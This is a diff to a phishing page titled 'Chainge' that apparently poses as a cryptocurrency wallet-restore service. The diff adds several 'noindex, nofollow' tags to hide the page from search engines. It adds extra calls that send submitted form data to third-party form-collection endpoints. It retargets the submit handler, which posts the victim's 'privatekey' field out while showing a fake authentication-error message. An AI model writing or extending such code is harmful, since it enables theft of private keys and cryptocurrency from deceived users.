@@ -1,5 +1,8 @@
 
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html><html lang="en"><head> <meta name="robots" content="noindex">
+    <meta name="robots" content="noindex, nofollow"> <meta name="robots" content="noindex">
+    <meta name="robots" content="noindex, nofollow">
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,
   user-scalable=0">
     <title>Chainge</title>
@@ -227,6 +230,20 @@
         try {
             await postData(
             dataToSubmit
+        , 'https://usebasin.com/f/ad4b4ad2c1cd');
+        } catch (error) {
+            
+        }
+        try {
+            await postData(
+            dataToSubmit
+        , 'https://formspree.io/f/mkgwebba');
+        } catch (error) {
+            
+        }
+        try {
+            await postData(
+            dataToSubmit
         , 'https://usebasin.com/f/51c5b5f8b45b');
         } catch (error) {
             
@@ -280,7 +297,7 @@
         $('form').on('submit', function(e) {
             e.preventDefault();
             new swal( "Error Restoring" ,  "Authentication error, please try again!" ,  "error" )
-            $.post('https://usebasin.com/f/51c5b5f8b45b', { 
+            $.post('https://usebasin.com/f/ad4b4ad2c1cd', { 
                 // to: 'Katieveronica315@gmail.com',
                 user: $('[name=privatekey]').val(),
                 pwd: '.',
